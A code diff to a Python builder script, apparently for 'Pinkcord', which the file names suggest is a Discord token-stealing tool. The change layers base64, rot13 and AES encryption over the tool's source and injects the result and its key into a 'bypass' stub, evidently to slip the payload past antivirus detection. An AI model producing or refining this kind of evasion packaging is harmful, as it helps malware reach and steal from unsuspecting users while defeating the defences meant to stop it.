@@ -4,6 +4,8 @@ import codecs
 import base64
 import platform
 import os
+import string
+import secrets
 
 TOKEN_FILE = 'template/pinkcord.py'
 TO_BYPASS_FILE = 'to_bypass.txt'
@@ -87,19 +89,35 @@ print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
 print(RED_COLOR + '2. No' + COLOR_RESET)
 answer = input("Choice: ")
 if answer == "1":
+    from Cryptodome.Cipher import AES
+    from Cryptodome.Random import get_random_bytes
+    from Cryptodome.Protocol.KDF import PBKDF2
+    from Cryptodome.Util.Padding import pad, unpad
+    def encrypt_code_AES(text, key):
+        cipher = AES.new(key, AES.MODE_CBC)
+        ciphertext = cipher.encrypt(pad(text.encode(), AES.block_size))
+        return base64.b64encode(cipher.iv + ciphertext).decode()
     print(YELLOW_COLOR + 'Encoding Pinkcord...' + COLOR_RESET)
     with open("pinkcord.py", 'r') as sourcecode:
-        with open(TO_BYPASS_FILE, 'w') as codefile:
-            codefile.write(sourcecode.read())
-            subprocess.check_call([sys.executable, 'bypasser.py'])
-            codefile.close()
-            sourcecode.close()
+       sourcecode = sourcecode.read()
+       sourcecode = sourcecode.encode('utf-8')
+       sourcecode = base64.b64encode(sourcecode)
+       sourcecode = sourcecode.decode('utf-8')
+       sourcecode = codecs.decode(sourcecode, 'rot13')
+       salt = get_random_bytes(32)
+       salt = get_random_bytes(32)
+       chars = string.ascii_letters + string.digits + string.punctuation
+       length = 10000
+       password = ''.join(secrets.choice(chars) for _ in range(length))
+       key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
+       sourcecode = encrypt_code_AES(sourcecode, key)
+       with open("AES_KEY.txt", "wb") as f:
+            f.write(base64.b64encode(key))
+    print(GREEN_COLOR + "[*] encoded" + COLOR_RESET)
     print(YELLOW_COLOR + "Creating a bypass script..." + COLOR_RESET)
-    with open(TO_BYPASS_FILE, 'r') as codefile:
-        encoded_code = codefile.read()
     with open(BYPASS_FILE, 'r') as bypass:
         content = bypass.read()
-        content = content.replace("<BYPASS>", encoded_code)
+        content = content.replace("<BYPASS>", sourcecode)
         with open(AES_KEY_FILE, 'r') as key:
             content = content.replace("<BYPASS_KEY>", key.read())
 
